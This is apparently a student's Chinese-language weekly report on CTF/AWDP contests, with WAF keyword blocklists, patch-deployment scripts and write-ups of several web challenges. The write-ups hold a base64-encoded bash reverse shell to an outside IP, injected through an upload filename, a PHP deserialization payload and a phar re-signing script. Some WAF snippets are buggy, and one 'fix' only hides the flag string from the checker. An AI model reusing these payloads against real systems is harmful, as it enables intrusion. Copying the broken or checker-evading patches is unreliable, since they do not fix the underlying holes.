# 2023年6月第3周周报-web-chen 

## 完成事项 

分区赛，sctf

## 下周待做事项 

awd学习

## 本周学习的知识分享 

### 这里就记录一下分区赛awdp的总结

###### web修补

php篇：

```
function wafrce($str){
	return !preg_match("/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i", $str);
}

function wafsqli($str){
	return !preg_match("/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|>|<|;|\"|\'|\^|\|/i", $str);
}

function wafxss($str){
	return !preg_match("/\'|http|\"|\`|cookie|<|>|script/i", $str);
}

$pattern = "/|../|./|../.|etc|var|php|jpg|jpeg|png|bmp|gif|flag|select|and|*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|>|<|;|"|'|^||?|'|http|`|cookie|<|>|script|system|tail|exec|base64|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|eval|passthru|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|conv|table|mysql_history|count|rpad|&|*|.|<|>|-|regexp|from|procedure|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|load|outfile|dumpfile|show|update|set|concat|delete|alter|not|for|is|between|group_concat|like|user|greatest|mid|char|hex|ord|limit|phar|zip|compress.bzip2|compress.zlib|ENTITY|DOCTYPE|SYSTEM|PUBLIC|escapeshellcmd|ob_start|ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect";

<?php
$str = "openlog";
if(preg_match("/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i", $str))
{
    echo "66";
}


匹配删除修补：
preg_replace('/flag/i','',$payload);
将payload中的部分删除

将要读取flag那部分换成大写来让check，check不到flag
<?php
$payload = "flag1111111";
$payload = preg_replace('/flag/i','FLAG',$payload);
echo $payload;
```

###### python篇

```
if re.match("/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i", file.filename) == None :
    	flag = 1
    	print("error")
    if flag == 1:
    	return "error"
    	
    	
import re
filename = "readlink"
flag = 0
if re.match("/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i", filename) :
    flag = 1
    print("error")
if flag == 1:
    print("error")
    	
    	
  import re

payload = "flag1111111"
payload = re.sub('flag', 'FLAG', payload, flags=re.IGNORECASE)
print(payload)
```



###### java篇（不过也没遇到java，不然就寄了，不会写patch包）

```
public class Main {
    public static void main(String args[]) {
        String Str = new String("Runoob");
        Str = Str.replace('o', 'T');
        System.out.println(Str);
    }
}



public class Main {
    public static void main(String args[]) {
        String payload = "flag1111111";
        payload = payload.replaceAll("(?i)flag|111", "FLAG");
        System.out.println(payload);
    }
}
```

###### golang篇

```
package main

import (
	"fmt"
	"strings"
)

func main() {
   
    var s string = "8888888888666666666"
    var old string = "888"
    var new1 string = ""
    fmt.Println("n=-1: ", strings.Replace(s, old, new1, -1 )) 
}



package main

import (
	"fmt"
	"regexp"
)

func main() {
	str := "Hello, world"
	match, _ := regexp.MatchString("Hello.*", str)
	fmt.Println(match) // true
}
```

###### node.js

```
let filename = "syslog"
let flag =0
if (/(openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore)/i.test(filename)) {
    let flag = 1
    console.log("error")
}
console.log("6666666")
if (flag === 1) {
    console.log("error")
}
else console.log("eroo")



let payload = "flag1111111";
payload = payload.replace(/flag/i,'FLAG');
console.log(payload);  
```



###### update.sh编写

```
php update.sh

#!/bin/bash

cp /index.php /var/www/html/index.php

Python

#!/bin/sh

cp /app.py /app/app.py
ps -ef | grep python | grep -v grep | awk '{print $2}' | xargs kill -9 
cd /app && nohup python app.py  >> /opt/app.log 2>&1 &

2023华北赛区
#!/bin/sh

cp app.py ../ctfpy/app.py
ps -ef | grep python | grep -v grep | awk '{print $2}' | xargs kill -9 
cd ../ctfpy && nohup python app.py  >> /opt/app.log 2>&1 &


Go

#!/bin/bash

kill -9 $(pidof app)
cp ezgo_patch /app
chmod +x /app
/app 2>&1 >/dev/null &

Nodejs

#!/bin/sh

cp server.js /app/server.js
ps -ef | grep node | grep -v grep | awk '{print $2}' | xargs kill -9 
cd /app && nohup node server.js  >> /opt/aa.log 2>&1 &

格式要求：一般会要求tar.gz的形式
打包命令：tar zcvf update.tar.gz send.php update.sh
```

还要根据具体的环境具体分析漏洞点去进行过滤，一定要快，快，快，多一轮一题多几百分

### 这是前几天看的别的赛区的记录

#### 2023华北赛区

### pysym

![image-20230620002246004](C:\Users\28595\AppData\Roaming\Typora\typora-user-images\image-20230620002246004.png)

命令直接拼接了，直接命令注入，

```
a||`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEuMS4xLjEvMzk5OTkgMD4mMQ==|base64 -d|bash -i`#


L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDkuMTI4LzU0MzIxIDA+JjE=
```

文件名注入的http请求：

```
POST / HTTP/1.1
Host: 1.1.1.1:12345
Content-Length: 277
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLtw6UwBXBsZ5zrtu

------WebKitFormBoundaryLtw6UwBXBsZ5zrtu
Content-Disposition: form-data; name="file"; filename="a||`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEuMS4xLjEvMzk5OTkgMD4mMQ==|base64 -d|bash -i`#"
Content-Type: image/jpeg

asdasd
------WebKitFormBoundaryLtw6UwBXBsZ5zrtu--

```

post文件上传包： 自己伪造文件上传，在本地运行即可

```
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>POST传输数据包</title>
</head>
<body>
	<form action="http://1.1.1.1:12345/" method="post" enctype="multipart/form-data">
		<label for="file">文件名：</label>
		<input type="file" name="file" id="file"><br>
		<input type="submit" name="submit" value="提交">
	</form>
</body>
</html>
```

###### fix:

update.sh:

```
#!/bin/sh

cp app.py ../ctfpy/app.py
ps -ef | grep python | grep -v grep | awk '{print $2}' | xargs kill -9 
cd ../ctfpy && nohup python app.py  >> /opt/app.log 2>&1 &
```

![image-20230620154127748](C:\Users\28595\AppData\Roaming\Typora\typora-user-images\image-20230620154127748.png)

app.py: 这里不列全部了，列举修的部分：

```
if re.match("/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i", file.filename) == None :
        flag = 1
        print("有war，不要乱玩")
    if flag == 1:
        return "有war，不要乱玩"
```

### easy_date

![image-20230620190632140](C:\Users\28595\AppData\Roaming\Typora\typora-user-images\image-20230620190632140.png)

Exception内置异常类的特性绕过

```
<?php
echo date("/\\e\\t\\c/\\p\\a\\s\\s\\w\\d");
//执行结果为 /etc/passwd
```

payload:

```
<?php
class date{
    public $a;
    public $b;
    public $file;
}

$a = new Error("payload",1);$b = new Error("payload",2); //要在一行
$adate=new date();
$adate->a=$a;
$adate->b=$b;
// $adate->file = "/\\e\\t\\c\\/p\\a\\s\\s\\w\\d";
$adate->file="/f\l\a\g.\\tx\\t";
$poc = base64_encode(serialize($adate));
echo $poc;
```

积累：通过内置异常类绕过两个非数组且值不相同md5值和sha1相同

### filechecker

- 正则匹配没有过滤php://filter，因此可以用php://filter打phar反序列化

- 题目用了mime_content_type函数，该函数参数完全可控，可以触发phar反序列化

  这个phar反序列化中有wakeup函数需要绕过，但是他那是经过phar产生的二进制文件，所以需要借助010去修改，修改后还需要更新签名

修改了phar中的部分数据后修改签名的脚本：

```
from hashlib import sha1
f = open('./test.gif', 'rb').read() # 修改内容后的phar文件
s = f[:-28] # 获取要签名的数据
print(s)
h = f[-8:] # 获取签名类型以及GBMB标识
print(h)
newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMB
open('datou.gif', 'wb').write(newf) # 写入新文件
```

### 2023ciscn西南赛区

### do_you_like_read

![image-20230622002557357](C:\Users\28595\AppData\Roaming\Typora\typora-user-images\image-20230622002557357.png)

直接控制$out_path值，输出flag

## 情感、思考、观点 

继续加油